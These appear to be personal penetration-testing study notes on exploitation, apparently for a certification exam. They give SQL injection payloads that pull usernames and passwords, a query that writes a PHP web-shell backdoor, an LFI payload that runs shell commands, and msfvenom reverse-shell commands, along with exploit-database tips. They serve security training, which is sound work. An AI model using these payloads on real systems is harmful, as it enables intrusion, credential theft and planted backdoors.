Now that you've gathered a lot of information, now comes time for the exploitation...The big stuf
## SQLi Exploitation
If you find places where you can input data into a site, you can attempt to bork it with SQL escape characters

Try putting a `'` in there and seeing if it spits out an error.  If you get an SQL error, you know you can do some SQLi.  This might also help you enumerate what type of DB the system is running.

Sample SQLi things to try:
`'`
`' OR 1=1; -- -`
`' OR 1=1 LIMIT 1; -- -`
`'UNION SELECT * FROM users WHERE 1=1; -- -`

You can enumerate database info using SQLI (normally you'd use `sqlmap` for this after locating an SQLi point, but c'est la vie...

Once you have found an SQLi point, you can figure out how many columns are in a table by doing the following: 
`[valid sql input] order by 1`
`[valid sql input] order by 2`
etc. until it errors out (Consider *Burp Repeater* for this)

`[Valid SQL Input] UNION ALL SELECT 1, 2, 3` (Note: number depends on number of columns determined in previous step)
Once you determine how many columns are available, you can form a union statement to chain a second query and see how data is displayed.

Then you can determine which column has the most space, making room for more fun commands/exploits (Commands below are based on **MariaDB**, others might be different:
`UNION ALL SELECT 1, 2, @@version`
`UNION ALL SELECT 1, 2, user ()`

You can view info about the DB's overall structure by checking out the information_schema:
`UNION ALL SELECT 1, 2, table_name FROM information_schema.tables`

And then you can enumerate even more info from specific tables:
`UNION ALL SELECT 1, 2. column_name FROM information_schema.columns WHERE table_name='users'`

Once you look through the columns on your interesting table, you can then reveal those columns too.
`UNION ALL SELECT 1, username, password FROM users`

You might be able to use the load_file function to execute code on the system as well:
`UNION ALL SELECT 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')` 

Even crazier, you might be able to use the `into OUTFILE` to write code, and insert it into the system
`UNION ALL SELECT 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
- This might present an error, but you could test it with the previous command and see if the file was created.
- OR you can just run it by trying `[URL]/backdoor.php?cmd=[command to use]`
## LFI and RFI Exploitation
Check for Directory Traversals, LFI and RFI on php pages.
- Consider inserting php code into log files and then running LFI exploits to run code.

SAMPLE LFI PHP WRAPPER PAYLOAD:
`http://[IP]/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>`

You know what directory traversal is

RFI means you are hosting the malicious payload (probably using the python simple web server).

### Shellshock

## Buffer Overflow
THIS WILL BE ON THE EXAM, WORTH 25 POINTS! DO THIS ONE FIRST.
NO LONGER RELEVANT

Reference Google Drive scripts:
`[REDACTED]`

In dummy terms;
Send a buncha stuff to the computer to overflow the stack, and overwrite the EIP to point to malicious code.

look out for `strcopy` in `C`.

**Immunity Debugger** is your friend

Make sure to check for `badchars`, and test on a windows machine.
`EXITFUNC=Thread` is a great option to set in your payload.  It'll prevent the entire program from crashing when you exit the shell, only the affected thread will crash.

The manual makes mention of noting shellcode sizes.  This was not an issue on eCPPT, but something we need to learn more about when we start doing the THM BOF room!
## Generating Shellcode
`msfvenom` is your friend. (msfvenom is in [Kali Linux Tools](https://www.kali.org/tools/msfpc/))

`msfvenom -p [payload] LHOST=[IP] LPORT=[PORT] EXITFUNC=THREAD -f [FORMAT] -a [ARCH] --platform [PLATFORM] -e [encoder] > [SHELLCODEFILENAME]`


`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.192 LPORT=6969 -f exe > shell-x64.exe`

- Try using common service ports if things don't quite work initially.  443, 80, etc.

[Infinite Logins' MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
## Public Exploits
[Exploit DB](https://www.exploit-db.com/) is a good source (`exploitdb` is included in [Kali Linux Tools](https://www.kali.org/tools/exploitdb/#exploitdb))
- [Twitter](https://twitter.com/exploitdb) and [RSS feeds](https://www.exploit-db.com/rss.xml) for new stuff

[Security Focus Archives](https://web.archive.org/web/20240000000000*/www.securityfocus.com) is also good 

[Packet Storm](https://packetstormsecurity.com/) is another site...

`searchsploit` is your best command line tool for searching for public exploits. (Also included in [Kali Linux Tools](https://www.kali.org/tools/exploitdb/#searchsploit))
`searchsploit [searchterm]`
`searchsploit -x [file to read]` (opens in vim)

You can copy an exploit file to your pwd:
`searchsploit -m [filename]`

Exploits for `searchsploit` are found in `/usr/share/exploitdb/exploits/`

**WHEN USING PUBLIC EXPLOITS, YOU'LL PROBABLY HAVE TO MESS WITH THEM A BIT**

Useful info:
`SEC_UNKNOWN_ISSUER` error can be bypassed with the `verify=False` param in Python
### Additional Forums
(Also see [SecLists.org](https://seclists.org/) for [Bugtraq archives](https://seclists.org/bugtraq/) and other, current forums/lists like [Full Disclosure](https://seclists.org/fulldisclosure/). *Added to Obsidian version*)
## Weird Metasploit 6 Commands Might Be Useful
- `set SMB::AlwaysEncrypt false`
- `set SMB::ProtocolVersion 1`